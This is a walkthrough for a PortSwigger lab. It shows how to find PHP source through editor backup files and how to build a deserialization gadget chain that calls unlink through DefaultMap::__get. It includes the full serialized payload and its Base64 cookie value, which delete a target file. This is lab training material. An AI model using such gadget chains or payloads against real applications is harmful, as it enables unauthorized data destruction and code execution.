# Developing a custom gadget chain for PHP deserialization

## Overview
This document captures the exact steps used to solve the PortSwigger lab that requires building a custom PHP deserialization gadget chain to delete `/home/carlos/morale.txt`.

## Step-by-step process

### 1) Identify source disclosure via backup files
1. Browse to common PHP files with a trailing `~` to retrieve editor backup files.
2. Focus on locations used by the app, for example:
   - `/cgi-bin/libs/CustomTemplate.php~`
   - `/cgi-bin/libs/Session.php~`
   - `/cgi-bin/index.php~`
3. Confirm you can read class definitions and locate magic methods such as `__wakeup()`, `__destruct()`, or `__toString()`.

### 2) Locate gadget primitives
1. From `CustomTemplate.php~`, identify:
   - `CustomTemplate::__wakeup()` calling `build_product()`.
   - `Product::__construct()` accessing `$desc->$default_desc_type`.
   - `DefaultMap::__get()` calling `call_user_func($this->callback, $name)`.
2. This allows a function call to be triggered by deserialization when a property is accessed.

### 3) Build the gadget chain
1. Create a `CustomTemplate` object where:
   - `default_desc_type` is set to `/home/carlos/morale.txt`.
   - `desc` is a `DefaultMap` object with `callback` set to `unlink`.
2. When the object is deserialized, `__wakeup()` triggers `build_product()`.
3. `Product` then attempts to access `$desc->$default_desc_type`, invoking `DefaultMap::__get()`.
4. `__get()` calls `unlink('/home/carlos/morale.txt')`, deleting the file.

### 4) Serialize the payload
Use the following serialized object:

O:14:"CustomTemplate":2:{s:33:"\0CustomTemplate\0default_desc_type";s:23:"/home/carlos/morale.txt";s:20:"\0CustomTemplate\0desc";O:10:"DefaultMap":1:{s:20:"\0DefaultMap\0callback";s:6:"unlink";}}

### 5) Encode for the session cookie
1. Base64-encode the serialized payload.
2. URL-encode the Base64 output (safe even if no special characters exist).
3. Replace the `session` cookie with the encoded payload.

Example encoded value used:

TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MjA6IgBDdXN0b21UZW1wbGF0ZQBkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjIwOiIARGVmYXVsdE1hcABjYWxsYmFjayI7czo2OiJ1bmxpbmsiO319

### 6) Trigger deserialization
1. Send any authenticated request with the modified `session` cookie.
2. The lab is solved when the file is deleted successfully.

## Notes
- The key insight is chaining `__wakeup()` to a property access that triggers `__get()`.
- File deletion works via `unlink` because PHP allows `call_user_func` on built-in functions.
